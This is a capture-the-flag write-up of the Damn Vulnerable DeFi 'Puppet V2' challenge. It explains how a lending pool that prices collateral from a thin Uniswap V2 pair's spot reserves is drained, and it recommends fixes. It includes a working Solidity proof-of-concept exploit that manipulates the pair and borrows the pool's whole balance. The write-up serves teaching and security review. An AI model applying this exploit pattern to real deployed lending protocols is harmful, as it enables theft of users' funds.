# Puppet V2 - Same Spot-Price Mistake, Bigger Collateral Factor

**Challenge:** Damn Vulnerable DeFi v4 - Puppet V2
**Category:** Oracle Manipulation / Spot Price From a Shallow AMM
**Severity:** Critical (the whole lending pool is drained for a fraction of its value)

## What's going on

A lending pool holds 1,000,000 DVT. To borrow, a user deposits WETH worth three times the
loan, and the pool values the token using a Uniswap V2 pair. The pair holds only 100 DVT
and 10 WETH. The player starts with 10,000 DVT and 20 ETH, and the goal is to move all
1,000,000 DVT to a recovery account.

This is the V2 version of Puppet. The pool now uses Uniswap's official library and a
3x collateral factor instead of 2x, but the weakness is the same.

## The bug

The price is computed from the pair's current reserves:

```solidity
function _getOracleQuote(uint256 amount) private view returns (uint256) {
    (uint256 reservesWETH, uint256 reservesToken) =
        UniswapV2Library.getReserves({factory: _uniswapFactory, tokenA: address(_weth), tokenB: address(_token)});

    return UniswapV2Library.quote({amountA: amount * 10 ** 18, reserveA: reservesToken, reserveB: reservesWETH});
}
```

`getReserves` plus `quote` is a spot price. Using Uniswap's own library does not make it
safe, because the pair is still a pool anyone can trade against in the same transaction.
The player's 10,000 DVT is 100 times the pair's token reserve. Selling it into the pair
drains almost all the WETH and leaves the pair full of DVT, so the WETH-per-DVT price
the lender reads collapses by orders of magnitude.

The 3x collateral factor does not help. A factor multiplies the price, and the price has
just moved by two orders of magnitude.

## The attack

1. Approve the router and swap all 10,000 DVT for ETH. From the constant-product formula
   that yields roughly 9.9 ETH and leaves the pair with about 0.1 WETH against 10,100 DVT.
2. Call `calculateDepositOfWETHRequired(1_000_000e18)`. It is now roughly 29.5 WETH
   instead of the 300,000 WETH it was before the swap.
3. Wrap ETH into WETH, approve the pool, and `borrow` the pool's entire DVT balance.
4. Transfer the borrowed tokens to the recovery account.

The player ends the swap with roughly 29.9 ETH (20 plus the swap proceeds), just enough
to cover the collateral. The figures above come from the pair formulas rather than from
logged output, so the margin is the one thing worth re-checking if the parameters change.

## PoC

```solidity
function test_puppetV2() public checkSolvedByPlayer {
    token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
    address[] memory path = new address[](2);
    path[0] = address(token);
    path[1] = address(weth);
    uniswapV2Router.swapExactTokensForETH(PLAYER_INITIAL_TOKEN_BALANCE, 1, path, player, block.timestamp);

    uint256 deposit = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);

    weth.deposit{value: deposit}();
    weth.approve(address(lendingPool), deposit);
    lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);

    token.transfer(recovery, token.balanceOf(player));
}
```

Full test file: `test/puppet-v2/PuppetV2.t.sol`

## Why I'm calling this Critical

- **Total loss of the lender's tokens.** All 1,000,000 DVT leave for a small deposit.
- **No special access or timing.** One user with enough tokens to move a very small
  pair, in a single transaction, with no waiting period.
- **The collateral is worth little.** The WETH deposited is valued at the manipulated
  price, so the pool is left holding almost nothing against the debt.
- **Same class as Puppet V1.** Upgrading the DEX version and the collateral factor did
  not touch the actual weakness.

## Fix

- Do not price from the instantaneous reserves of one pair. Use a TWAP over a window long
  enough that moving it costs more than the profit, or an external price feed.
- Do not compensate with a larger collateral factor. It scales the manipulated price.
- Check the liquidity behind the oracle. A 10 WETH pair should never secure a pool that
  holds 1,000,000 tokens, and the pool should refuse to lend when liquidity is too thin.

## Takeaway

Moving from V1 to V2 changed the interface but not the weakness. When reviewing a lender,
ask whether the price it reads can be changed inside the transaction that reads it, and
compare the pair's depth with the value the pool protects. Puppet V3 is the same exercise
against Uniswap V3's built-in TWAP oracle.
